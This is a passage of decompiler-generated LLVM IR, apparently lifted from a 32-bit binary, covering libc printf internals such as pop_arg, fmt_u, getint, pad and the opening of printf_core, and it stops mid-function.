  store i32 %v1_8051bd2, i32* %v2_8051bd5, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8051bf4

dec_label_pc_8051bdc:                             ; preds = %dec_label_pc_8051bb7
  %v0_8051bdc = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051bdc = add i32 %v0_8051bdc, 48
  %v2_8051bdc = inttoptr i32 %v1_8051bdc to i32*
  %v3_8051bdc = load i32, i32* %v2_8051bdc, align 4
  store i32 %v3_8051bdc, i32* %eax.global-to-local, align 4
  %v2_8051bdf = add i32 %v0_8051bdc, 44
  %v3_8051bdf = inttoptr i32 %v2_8051bdf to i32*
  %v4_8051bdf = load i32, i32* %v3_8051bdf, align 4
  %v5_8051bdf = add i32 %v4_8051bdf, %v3_8051bdc
  store i32 %v5_8051bdf, i32* %eax.global-to-local, align 4
  %v2_8051be2 = add i32 %v0_8051bdc, 8
  %v3_8051be2 = inttoptr i32 %v2_8051be2 to i32*
  store i32 %v5_8051bdf, i32* %v3_8051be2, align 4
  %v0_8051be5 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051be5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051be5 = add i32 %v1_8051be5, 4
  %v3_8051be5 = inttoptr i32 %v2_8051be5 to i32*
  store i32 %v0_8051be5, i32* %v3_8051be5, align 4
  %v0_8051be8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051be8 = inttoptr i32 %v0_8051be8 to i32*
  %v2_8051be8 = load i32, i32* %v1_8051be8, align 4
  %v1_8051bea = and i32 %v2_8051be8, 16
  %v2_8051bea = icmp eq i32 %v1_8051bea, 0
  %v2_8051bf0 = zext i1 %v2_8051bea to i32
  store i1 %v2_8051bea, i1* %cf.global-to-local, align 1
  %v13_8051bf0 = icmp eq i1 %v2_8051bea, false
  store i1 %v13_8051bf0, i1* %zf.global-to-local, align 1
  store i32 %v2_8051bf0, i32* %eax.global-to-local, align 4
  %tmp = sext i1 %v2_8051bea to i32
  %v1_8051bf2 = add nsw i32 %tmp, -1
  br label %dec_label_pc_8051bf4

dec_label_pc_8051bf4:                             ; preds = %dec_label_pc_8051bd2, %dec_label_pc_8051bdc
  %storemerge = phi i32 [ -1, %dec_label_pc_8051bd2 ], [ %v1_8051bf2, %dec_label_pc_8051bdc ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_8051bf6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051bf6, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i1 %v2_8051bea, { 0, 3, 1, 2 }
  uselistorder i1 %v3_8051bce, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 2, 0, 1, 3 }
  uselistorder i32 %tmp1, { 1, 0, 3, 2 }
  uselistorder i8 -1, { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8051bf4, { 1, 0 }
  uselistorder label %dec_label_pc_8051bb7, { 1, 0 }
}

define i32 @__toread_needs_stdio_exit() local_unnamed_addr {
entry:
  %v0_8051bf8 = call i32 @__stdio_exit()
  ret i32 %v0_8051bf8

; uselistorder directives
  uselistorder i32 ()* @__stdio_exit, { 2, 1, 0 }
}

define i32 @pop_arg() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %v0_8051c01 = load i32, i32* @eax, align 4
  store i32 %v0_8051c01, i32* %ebx.global-to-local, align 4
  %v0_8051c06 = load i32, i32* @edx, align 4
  %v6_8051c09 = icmp ugt i32 %v0_8051c06, 20
  br i1 %v6_8051c09, label %dec_label_pc_8051cac, label %dec_label_pc_8051c0f

dec_label_pc_8051c0f:                             ; preds = %entry
  %v1_8051c0f = add i32 %v0_8051c06, -9
  store i32 %v1_8051c0f, i32* %eax.global-to-local, align 4
  %v6_8051c15 = icmp ugt i32 %v1_8051c0f, 9
  br i1 %v6_8051c15, label %dec_label_pc_8051cac, label %dec_label_pc_8051c1b

dec_label_pc_8051c1b:                             ; preds = %dec_label_pc_8051c0f
  %v0_8051c1b = load i32, i32* @ecx, align 4
  %v1_8051c1b = inttoptr i32 %v0_8051c1b to i32*
  %v2_8051c1b = load i32, i32* %v1_8051c1b, align 4
  store i32 %v2_8051c1b, i32* %edx.global-to-local, align 4
  %v1_8051c1d = mul i32 %v1_8051c0f, 4
  %v2_8051c1d = add i32 %v1_8051c1d, ptrtoint (i32* @global_var_8054718.391 to i32)
  %v3_8051c1d = inttoptr i32 %v2_8051c1d to i32*
  %v4_8051c1d = load i32, i32* %v3_8051c1d, align 4
  call void @__pseudo_branch(i32 %v4_8051c1d)
  %v1_8051c24 = add i32 %v2_8051c1b, 4
  store i32 %v1_8051c24, i32* %eax.global-to-local, align 4
  %v1_8051c27 = load i32, i32* @ecx, align 4
  %v2_8051c27 = inttoptr i32 %v1_8051c27 to i32*
  store i32 %v1_8051c24, i32* %v2_8051c27, align 4
  %v0_8051c29 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051c29 = inttoptr i32 %v0_8051c29 to i32*
  %v2_8051c29 = load i32, i32* %v1_8051c29, align 4
  store i32 %v2_8051c29, i32* %eax.global-to-local, align 4
  %v1_8051c2b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051c2b = inttoptr i32 %v1_8051c2b to i32*
  store i32 %v2_8051c29, i32* %v2_8051c2b, align 4
  %v0_8051cb0.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051cac

dec_label_pc_8051cac:                             ; preds = %dec_label_pc_8051c0f, %entry, %dec_label_pc_8051c1b
  %v0_8051cb0 = phi i32 [ %v1_8051c0f, %dec_label_pc_8051c0f ], [ %v0_8051c01, %entry ], [ %v0_8051cb0.pre, %dec_label_pc_8051c1b ]
  ret i32 %v0_8051cb0

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_8051cac, { 2, 0, 1 }
}

define i32 @fmt_u() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i64, align 8
  %stack_var_-12 = alloca i32, align 4
  %v0_8051cb1 = load i32, i32* @edi, align 4
  %v0_8051cb2 = load i32, i32* @ecx, align 4
  store i32 %v0_8051cb2, i32* @edi, align 4
  %v0_8051cb4 = load i32, i32* @esi, align 4
  %v0_8051cb5 = load i32, i32* @edx, align 4
  store i32 %v0_8051cb5, i32* @esi, align 4
  %v0_8051cb7 = load i32, i32* @ebx, align 4
  store i32 %v0_8051cb7, i32* %stack_var_-12, align 4
  %v0_8051cb8 = load i32, i32* @eax, align 4
  store i32 %v0_8051cb8, i32* %ebx.global-to-local, align 4
  %v1_8051ce213 = icmp eq i32 %v0_8051cb5, 0
  br i1 %v1_8051ce213, label %dec_label_pc_8051cfe.preheader, label %dec_label_pc_8051cbc.lr.ph

dec_label_pc_8051cbc.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8051cbc

dec_label_pc_8051cbc:                             ; preds = %dec_label_pc_8051cbc.dec_label_pc_8051cbc_crit_edge, %dec_label_pc_8051cbc.lr.ph
  %v0_8051cc2 = phi i32 [ %v9_8051cd6, %dec_label_pc_8051cbc.dec_label_pc_8051cbc_crit_edge ], [ %v0_8051cb8, %dec_label_pc_8051cbc.lr.ph ]
  %v0_8051cc1 = phi i32 [ %v0_8051ce0, %dec_label_pc_8051cbc.dec_label_pc_8051cbc_crit_edge ], [ %v0_8051cb5, %dec_label_pc_8051cbc.lr.ph ]
  %v0_8051cbe = phi i32 [ %v0_8051cbe.pre, %dec_label_pc_8051cbc.dec_label_pc_8051cbc_crit_edge ], [ %v0_8051cb2, %dec_label_pc_8051cbc.lr.ph ]
  %v1_8051cbe = add i32 %v0_8051cbe, -1
  store i32 %v1_8051cbe, i32* @edi, align 4
  %v5_8051cc1 = sext i32 %v0_8051cc1 to i64
  %v5_8051cc2 = sext i32 %v0_8051cc2 to i64
  store i64 %v5_8051cc2, i64* %stack_var_-28, align 8
  %v8_8051cc3 = call i64 @__umoddi3(i64 %v5_8051cc2, i64 %v5_8051cc1)
  %v9_8051cc3 = trunc i64 %v8_8051cc3 to i32
  %v0_8051ccf = load i32, i32* @esi, align 4
  %v5_8051ccf = sext i32 %v0_8051ccf to i64
  %v0_8051cd0 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8051cd0 = sext i32 %v0_8051cd0 to i64
  store i64 %v5_8051cd0, i64* %stack_var_-28, align 8
  %v1_8051cd1 = add i32 %v9_8051cc3, 48
  %v8_8051cd1 = trunc i32 %v1_8051cd1 to i8
  store i32 %v1_8051cd1, i32* %eax.global-to-local, align 4
  %v2_8051cd4 = load i32, i32* @edi, align 4
  %v3_8051cd4 = inttoptr i32 %v2_8051cd4 to i8*
  store i8 %v8_8051cd1, i8* %v3_8051cd4, align 1
  %v0_8051cd6 = load i64, i64* %stack_var_-28, align 8
  %v8_8051cd6 = call i64 @__udivdi3(i64 %v0_8051cd6, i64 %v5_8051ccf)
  %v9_8051cd6 = trunc i64 %v8_8051cd6 to i32
  store i32 %v9_8051cd6, i32* %eax.global-to-local, align 4
  store i32 %v9_8051cd6, i32* %ebx.global-to-local, align 4
  %v0_8051ce0 = load i32, i32* @edx, align 4
  store i32 %v0_8051ce0, i32* @esi, align 4
  %v1_8051ce2 = icmp eq i32 %v0_8051ce0, 0
  br i1 %v1_8051ce2, label %dec_label_pc_8051cfe.preheader, label %dec_label_pc_8051cbc.dec_label_pc_8051cbc_crit_edge

dec_label_pc_8051cbc.dec_label_pc_8051cbc_crit_edge: ; preds = %dec_label_pc_8051cbc
  %v0_8051cbe.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051cbc

dec_label_pc_8051cfe.preheader:                   ; preds = %dec_label_pc_8051cbc, %entry
  %storemerge3 = phi i32 [ %v0_8051cb8, %entry ], [ %v9_8051cd6, %dec_label_pc_8051cbc ]
  %v1_8051cfe4 = icmp eq i32 %storemerge3, 0
  %v1_8051d0011 = icmp eq i1 %v1_8051cfe4, false
  br i1 %v1_8051d0011, label %dec_label_pc_8051ceb, label %dec_label_pc_8051d02

dec_label_pc_8051ceb:                             ; preds = %dec_label_pc_8051cfe.preheader, %dec_label_pc_8051ceb
  %v0_8051ceb = phi i32 [ %storemerge, %dec_label_pc_8051ceb ], [ %storemerge3, %dec_label_pc_8051cfe.preheader ]
  store i32 10, i32* @ecx, align 4
  %v0_8051cf4 = load i32, i32* @edi, align 4
  %v1_8051cf4 = add i32 %v0_8051cf4, -1
  store i32 %v1_8051cf4, i32* @edi, align 4
  %div = udiv i32 %v0_8051ceb, 10
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp34 = urem i32 %v0_8051ceb, 10
  %v1_8051cf7 = or i32 %tmp34, 48
  %v8_8051cf7 = trunc i32 %v1_8051cf7 to i8
  %v3_8051cfa = inttoptr i32 %v1_8051cf4 to i8*
  store i8 %v8_8051cf7, i8* %v3_8051cfa, align 1
  %storemerge = load i32, i32* %eax.global-to-local, align 4
  %v1_8051cfe = icmp eq i32 %storemerge, 0
  %v1_8051d00 = icmp eq i1 %v1_8051cfe, false
  br i1 %v1_8051d00, label %dec_label_pc_8051ceb, label %dec_label_pc_8051d02

dec_label_pc_8051d02:                             ; preds = %dec_label_pc_8051ceb, %dec_label_pc_8051cfe.preheader
  %v0_8051d02 = load i32, i32* @edi, align 4
  store i32 %v0_8051d02, i32* %eax.global-to-local, align 4
  %v2_8051d04 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051d04, i32* @ebx, align 4
  store i32 %v0_8051cb4, i32* @esi, align 4
  store i32 %v0_8051cb1, i32* @edi, align 4
  ret i32 %v0_8051d02

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v0_8051ce0, { 1, 2, 0 }
  uselistorder i32 %v9_8051cd6, { 0, 2, 3, 1 }
  uselistorder i64* %stack_var_-28, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8051ceb, { 1, 0 }
}

define i32 @getint() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051d09 = load i32, i32* @eax, align 4
  store i32 %v0_8051d09, i32* %esi.global-to-local, align 4
  %v0_8051d0b = load i32, i32* @ebx, align 4
  store i32 %v0_8051d0b, i32* %stack_var_-8, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051d1b

dec_label_pc_8051d10:                             ; preds = %dec_label_pc_8051d1b
  %v3_8051d10 = mul i32 %v1_8051d10, 10
  %v2_8051d13 = add i32 %v1_8051d20, %v3_8051d10
  store i32 %v2_8051d13, i32* %ebx.global-to-local, align 4
  %v1_8051d16 = add i32 %v2_8051d1b, 1
  store i32 %v1_8051d16, i32* %v1_8051d1b, align 4
  %v0_8051d1b.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8051d10.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051d1b

dec_label_pc_8051d1b:                             ; preds = %entry, %dec_label_pc_8051d10
  %v1_8051d10 = phi i32 [ 0, %entry ], [ %v1_8051d10.pre, %dec_label_pc_8051d10 ]
  %v1_8051d19 = phi i32 [ %v0_8051d09, %entry ], [ %v0_8051d1b.pre, %dec_label_pc_8051d10 ]
  %v1_8051d1b = inttoptr i32 %v1_8051d19 to i32*
  %v2_8051d1b = load i32, i32* %v1_8051d1b, align 4
  store i32 %v2_8051d1b, i32* @ecx, align 4
  %v1_8051d1d = inttoptr i32 %v2_8051d1b to i8*
  %v2_8051d1d = load i8, i8* %v1_8051d1d, align 1
  %v3_8051d1d = sext i8 %v2_8051d1d to i32
  %v1_8051d20 = add nsw i32 %v3_8051d1d, -48
  %v5_8051d23 = icmp ult i32 %v1_8051d20, 9
  %v9_8051d23 = icmp eq i8 %v2_8051d1d, 57
  %v2_8051d26 = or i1 %v9_8051d23, %v5_8051d23
  br i1 %v2_8051d26, label %dec_label_pc_8051d10, label %dec_label_pc_8051d28

dec_label_pc_8051d28:                             ; preds = %dec_label_pc_8051d1b
  %v2_8051d2a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051d2a, i32* %ebx.global-to-local, align 4
  ret i32 %v1_8051d10

; uselistorder directives
  uselistorder i32 %v1_8051d20, { 1, 0 }
  uselistorder i32 %v2_8051d1b, { 1, 2, 0 }
  uselistorder i32* %v1_8051d1b, { 1, 0 }
  uselistorder i32 %v1_8051d10, { 1, 0 }
  uselistorder label %dec_label_pc_8051d1b, { 1, 0 }
}

define i32 @out() local_unnamed_addr {
entry:
  %v0_8051d30 = load i32, i32* @eax, align 4
  %v1_8051d30 = inttoptr i32 %v0_8051d30 to i8*
  %v2_8051d30 = load i8, i8* %v1_8051d30, align 1
  %v3_8051d30 = and i8 %v2_8051d30, 32
  %v4_8051d30 = icmp eq i8 %v3_8051d30, 0
  %v1_8051d33 = icmp eq i1 %v4_8051d30, false
  br i1 %v1_8051d33, label %dec_label_pc_8051d43, label %dec_label_pc_8051d35

dec_label_pc_8051d35:                             ; preds = %entry
  %v0_8051d39 = load i32, i32* @ecx, align 4
  %v0_8051d3a = load i32, i32* @edx, align 4
  %v3_8051d3b = call i32 @__fwritex(i32 %v0_8051d3a, i32 %v0_8051d39, i32 %v0_8051d30)
  br label %dec_label_pc_8051d43

dec_label_pc_8051d43:                             ; preds = %entry, %dec_label_pc_8051d35
  %.0 = phi i32 [ undef, %entry ], [ %v3_8051d3b, %dec_label_pc_8051d35 ]
  ret i32 %.0

; uselistorder directives
  uselistorder label %dec_label_pc_8051d43, { 1, 0 }
}

define i32 @pad() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %v0_8051d47 = load i32, i32* @edi, align 4
  %v0_8051d48 = load i32, i32* @eax, align 4
  store i32 %v0_8051d48, i32* @edi, align 4
  %v0_8051d4a = load i32, i32* @esi, align 4
  %v0_8051d4b = load i32, i32* @edx, align 4
  %v1_8051d4b = urem i32 %v0_8051d4b, 256
  %v3_8051d4b = and i32 %v0_8051d48, -256
  %v4_8051d4b = or i32 %v1_8051d4b, %v3_8051d4b
  %v0_8051d4d = load i32, i32* @ebx, align 4
  %v12_8051d4e = ptrtoint i32* %stack_var_-268 to i32
  %v4_8051d54 = and i32 %tmp7, 73728
  %v5_8051d54 = icmp eq i32 %v4_8051d54, 0
  %v1_8051d66 = icmp eq i1 %v5_8051d54, false
  br i1 %v1_8051d66, label %dec_label_pc_8051dbb, label %dec_label_pc_8051d68

dec_label_pc_8051d68:                             ; preds = %entry
  %v1_8051d68 = load i32, i32* @ecx, align 4
  %v5_8051d6a = icmp sgt i32 %v1_8051d68, %tmp
  br i1 %v5_8051d6a, label %dec_label_pc_8051d6c, label %dec_label_pc_8051dbb

dec_label_pc_8051d6c:                             ; preds = %dec_label_pc_8051d68
  %v2_8051d6e = sub i32 %v1_8051d68, %tmp
  store i32 %v2_8051d6e, i32* @esi, align 4
  %tmp28 = icmp ult i32 %v2_8051d6e, 257
  br i1 %tmp28, label %dec_label_pc_8051d80, label %dec_label_pc_8051d7b

dec_label_pc_8051d7b:                             ; preds = %dec_label_pc_8051d6c
  br label %dec_label_pc_8051d80

dec_label_pc_8051d80:                             ; preds = %dec_label_pc_8051d6c, %dec_label_pc_8051d7b
  %v0_8051d80 = phi i32 [ 256, %dec_label_pc_8051d7b ], [ %v2_8051d6e, %dec_label_pc_8051d6c ]
  %v1_8051d81 = mul i32 %v0_8051d4b, 16777216
  %v2_8051d81 = sdiv i32 %v1_8051d81, 16777216
  store i32 %v12_8051d4e, i32* @ebx, align 4
  %v3_8051d8a = bitcast i32* %stack_var_-268 to i8*
  %v4_8051d8a = call i32 @memset(i8* %v3_8051d8a, i32 %v2_8051d81, i32 %v0_8051d80)
  %v0_8051da817 = load i32, i32* @esi, align 4
  %v6_8051dae25 = icmp ugt i32 %v0_8051da817, 255
  br i1 %v6_8051dae25, label %dec_label_pc_8051d94, label %dec_label_pc_8051db0

dec_label_pc_8051d94:                             ; preds = %dec_label_pc_8051d80, %dec_label_pc_8051d94
  %v0_8051da826 = phi i32 [ %v0_8051da8, %dec_label_pc_8051d94 ], [ %v0_8051da817, %dec_label_pc_8051d80 ]
  store i32 256, i32* @ecx, align 4
  store i32 %v12_8051d4e, i32* @edx, align 4
  %v0_8051d9b = load i32, i32* @edi, align 4
  store i32 %v0_8051d9b, i32* @eax, align 4
  %v1_8051d9d = add i32 %v0_8051da826, -256
  store i32 %v1_8051d9d, i32* @esi, align 4
  %v0_8051da3 = call i32 @out()
  %v0_8051da8 = load i32, i32* @esi, align 4
  %v6_8051dae = icmp ugt i32 %v0_8051da8, 255
  br i1 %v6_8051dae, label %dec_label_pc_8051d94, label %dec_label_pc_8051db0

dec_label_pc_8051db0:                             ; preds = %dec_label_pc_8051d94, %dec_label_pc_8051d80
  %v0_8051da8.lcssa = phi i32 [ %v0_8051da817, %dec_label_pc_8051d80 ], [ %v0_8051da8, %dec_label_pc_8051d94 ]
  store i32 %v0_8051da8.lcssa, i32* @ecx, align 4
  store i32 %v12_8051d4e, i32* @edx, align 4
  %v0_8051db4 = load i32, i32* @edi, align 4
  store i32 %v0_8051db4, i32* @eax, align 4
  %v0_8051db6 = call i32 @out()
  br label %dec_label_pc_8051dbb

dec_label_pc_8051dbb:                             ; preds = %dec_label_pc_8051d68, %entry, %dec_label_pc_8051db0
  %v0_8051dc4 = phi i32 [ %v4_8051d4b, %dec_label_pc_8051d68 ], [ %v4_8051d4b, %entry ], [ %v0_8051db6, %dec_label_pc_8051db0 ]
  store i32 %v0_8051d4d, i32* @ebx, align 4
  store i32 %v0_8051d4a, i32* @esi, align 4
  store i32 %v0_8051d47, i32* @edi, align 4
  ret i32 %v0_8051dc4

; uselistorder directives
  uselistorder i32 %v0_8051da8, { 0, 2, 1 }
  uselistorder i32 %v2_8051d6e, { 1, 0, 2 }
  uselistorder i32 %v1_8051d68, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 255, { 5, 1, 0, 6, 7, 4, 2, 3, 8 }
  uselistorder i32 (i8*, i32, i32)* @memset, { 15, 1, 10, 16, 7, 17, 0, 18, 5, 11, 19, 12, 13, 14, 20, 2, 3, 4, 6, 8, 9 }
  uselistorder label %dec_label_pc_8051dbb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051d94, { 1, 0 }
  uselistorder label %dec_label_pc_8051d80, { 1, 0 }
}

define i32 @printf_core(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  %stack_var_-341 = alloca i32, align 4
  %stack_var_-7868 = alloca i32, align 4
  store i32 0, i32* @edi, align 4
  %v15_8051dcb = ptrtoint i32* %stack_var_-7868 to i32
  %v0_8051dd1 = load i32, i32* @eax, align 4
  %v2_8051dd5 = ptrtoint i32* %stack_var_-341 to i32
  store i32 %v2_8051dd5, i32* %eax.global-to-local, align 4
  %v0_8051ddc = load i32, i32* @ecx, align 4
  %v5_8051ddc = sext i32 %v0_8051ddc to i64
  %v6_8051df7 = sext i32 %v2_8051dd5 to i64
  %v5_80520fb = bitcast i32* %stack_var_-341 to i8*
  %v7_8052675 = sext i32 %v2_8051dd5 to i80
  %v8_8052675 = bitcast i80 %v7_8052675 to x86_fp80
  br label %dec_label_pc_8051dfb

dec_label_pc_8051dfb:                             ; preds = %dec_label_pc_8051dfb.backedge, %entry
  %v21_8051e24 = phi i32 [ %v0_8051dfb.pre, %dec_label_pc_8051dfb.backedge ], [ %v15_8051dcb, %entry ]
  %v1_8051dfb = add i32 %v21_8051e24, 60
  %v2_8051dfb = inttoptr i32 %v1_8051dfb to i32*
  %v3_8051dfb = load i32, i32* %v2_8051dfb, align 4
  %v5_8051dfb = icmp slt i32 %v3_8051dfb, 0
  br i1 %v5_8051dfb, label %dec_label_pc_8051e28, label %dec_label_pc_8051e02

dec_label_pc_8051e02:                             ; preds = %dec_label_pc_8051dfb
  store i32 2147483647, i32* %eax.global-to-local, align 4
  %v4_8051e07 = load i32, i32* %v2_8051dfb, align 4
  %v5_8051e07 = sub i32 2147483647, %v4_8051e07
  store i32 %v5_8051e07, i32* %eax.global-to-local, align 4
  %v0_8051e0b = load i32, i32* @edi, align 4
  %v2_8051e0b = sub i32 %v0_8051e0b, %v5_8051e07
  %v8_8051e0b = xor i32 %v0_8051e0b, %v5_8051e07
  %v9_8051e0b = xor i32 %v2_8051e0b, %v0_8051e0b
  %v10_8051e0b = and i32 %v9_8051e0b, %v8_8051e0b
  %v11_8051e0b = icmp slt i32 %v10_8051e0b, 0
  %v12_8051e0b = icmp eq i32 %v2_8051e0b, 0
  %v13_8051e0b = icmp slt i32 %v2_8051e0b, 0
  %v3_8051e0d = icmp ne i1 %v13_8051e0b, %v11_8051e0b
  %v4_8051e0d = or i1 %v12_8051e0b, %v3_8051e0d
  br i1 %v4_8051e0d, label %dec_label_pc_8051e24, label %dec_label_pc_8051e0f

dec_label_pc_8051e0f:                             ; preds = %dec_label_pc_8051e02
  %v2_8051e0f = call i32 @__errno_location(i32 %v2_8051dd5)
  store i32 %v2_8051e0f, i32* %eax.global-to-local, align 4
  %v0_8051e14 = load i32, i32* @esp, align 4
  %v1_8051e14 = add i32 %v0_8051e14, 60
  %v2_8051e14 = inttoptr i32 %v1_8051e14 to i32*
  store i32 -1, i32* %v2_8051e14, align 4
  %v0_8051e1c = load i32, i32* %eax.global-to-local, align 4
  %v1_8051e1c = inttoptr i32 %v0_8051e1c to i32*
  store i32 75, i32* %v1_8051e1c, align 4
  br label %dec_label_pc_8051e28

dec_label_pc_8051e24:                             ; preds = %dec_label_pc_8051e02
  %v3_8051e24 = load i32, i32* %v2_8051dfb, align 4
  %v5_8051e24 = add i32 %v3_8051e24, %v0_8051e0b
  store i32 %v5_8051e24, i32* %v2_8051dfb, align 4
  br label %dec_label_pc_8051e28

dec_label_pc_8051e28:                             ; preds = %dec_label_pc_8051dfb, %dec_label_pc_8051e0f, %dec_label_pc_8051e24
  %v0_8051e28 = load i32, i32* @esp, align 4
  %v1_8051e28 = add i32 %v0_8051e28, 7836
  %v2_8051e28 = inttoptr i32 %v1_8051e28 to i32*
  %v3_8051e28 = load i32, i32* %v2_8051e28, align 4
  store i32 %v3_8051e28, i32* @esi, align 4
  %v1_8051e2f = inttoptr i32 %v3_8051e28 to i8*
  %v2_8051e2f = load i8, i8* %v1_8051e2f, align 1
  %v3_8051e2f = icmp eq i8 %v2_8051e2f, 0
  %v1_8051e32 = icmp eq i1 %v3_8051e2f, false
  br i1 %v1_8051e32, label %dec_label_pc_8051e43.preheader, label %dec_label_pc_8053343

dec_label_pc_8051e43.preheader:                   ; preds = %dec_label_pc_8051e28
  %v3_8051e43275 = load i32, i32* %v2_8051e28, align 4
  store i32 %v3_8051e43275, i32* %edx.global-to-local, align 4
  %v1_8051e4a276 = inttoptr i32 %v3_8051e43275 to i8*
  %v2_8051e4a277 = load i8, i8* %v1_8051e4a276, align 1
  %v3_8051e4a278 = zext i8 %v2_8051e4a277 to i32
  %v4_8051e4a279 = load i32, i32* %eax.global-to-local, align 4
  %v5_8051e4a280 = and i32 %v4_8051e4a279, -256
  %v6_8051e4a281 = or i32 %v5_8051e4a280, %v3_8051e4a278
  store i32 %v6_8051e4a281, i32* %eax.global-to-local, align 4
  %v4_8051e4c282 = icmp eq i8 %v2_8051e4a277, 0
  br i1 %v4_8051e4c282, label %dec_label_pc_8051e61, label %dec_label_pc_8051e50

dec_label_pc_8051e39:                             ; preds = %dec_label_pc_8051e50
  %v1_8051e39 = add i32 %v3_8051e43286, 1
  store i32 %v1_8051e39, i32* %eax.global-to-local, align 4
  store i32 %v1_8051e39, i32* %v2_8051e43285, align 4
  %v0_8051e43.pre = load i32, i32* @esp, align 4
  %v1_8051e43 = add i32 %v0_8051e43.pre, 7836
  %v2_8051e43 = inttoptr i32 %v1_8051e43 to i32*
  %v3_8051e43 = load i32, i32* %v2_8051e43, align 4
  store i32 %v3_8051e43, i32* %edx.global-to-local, align 4
  %v1_8051e4a = inttoptr i32 %v3_8051e43 to i8*
  %v2_8051e4a = load i8, i8* %v1_8051e4a, align 1
  %v3_8051e4a = zext i8 %v2_8051e4a to i32
  %v4_8051e4a = load i32, i32* %eax.global-to-local, align 4
  %v5_8051e4a = and i32 %v4_8051e4a, -256
  %v6_8051e4a = or i32 %v5_8051e4a, %v3_8051e4a
  store i32 %v6_8051e4a, i32* %eax.global-to-local, align 4
  %v4_8051e4c = icmp eq i8 %v2_8051e4a, 0
  br i1 %v4_8051e4c, label %dec_label_pc_8051e61, label %dec_label_pc_8051e50

dec_label_pc_8051e50:                             ; preds = %dec_label_pc_8051e43.preheader, %dec_label_pc_8051e39
  %v2_8051e4a287 = phi i8 [ %v2_8051e4a, %dec_label_pc_8051e39 ], [ %v2_8051e4a277, %dec_label_pc_8051e43.preheader ]
  %v3_8051e43286 = phi i32 [ %v3_8051e43, %dec_label_pc_8051e39 ], [ %v3_8051e43275, %dec_label_pc_8051e43.preheader ]
  %v2_8051e43285 = phi i32* [ %v2_8051e43, %dec_label_pc_8051e39 ], [ %v2_8051e28, %dec_label_pc_8051e43.preheader ]
  %v1_8051e3c284 = phi i32 [ %v0_8051e43.pre, %dec_label_pc_8051e39 ], [ %v0_8051e28, %dec_label_pc_8051e43.preheader ]
  %v10_8051e50 = icmp eq i8 %v2_8051e4a287, 37
  %v1_8051e52 = icmp eq i1 %v10_8051e50, false
  br i1 %v1_8051e52, label %dec_label_pc_8051e39, label %dec_label_pc_8051e61

dec_label_pc_8051e56:                             ; preds = %dec_label_pc_8051e6d
  %v1_8051e56 = add i32 %v3_8051e61, 2
  store i32 %v1_8051e56, i32* %eax.global-to-local, align 4
  %v0_8051e59 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051e59 = add i32 %v0_8051e59, 1
  store i32 %v1_8051e59, i32* %edx.global-to-local, align 4
  store i32 %v1_8051e56, i32* %v2_8051e61, align 4
  %v0_8051e61.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051e61

dec_label_pc_8051e61:                             ; preds = %dec_label_pc_8051e43.preheader, %dec_label_pc_8051e39, %dec_label_pc_8051e50, %dec_label_pc_8051e56
  %v0_8051e7e = phi i32 [ %v0_8051e61.pre, %dec_label_pc_8051e56 ], [ %v0_8051e28, %dec_label_pc_8051e43.preheader ], [ %v0_8051e43.pre, %dec_label_pc_8051e39 ], [ %v1_8051e3c284, %dec_label_pc_8051e50 ]
  %v1_8051e61 = add i32 %v0_8051e7e, 7836
  %v2_8051e61 = inttoptr i32 %v1_8051e61 to i32*
  %v3_8051e61 = load i32, i32* %v2_8051e61, align 4
  store i32 %v3_8051e61, i32* %eax.global-to-local, align 4
  %v1_8051e68 = inttoptr i32 %v3_8051e61 to i8*
  %v2_8051e68 = load i8, i8* %v1_8051e68, align 1
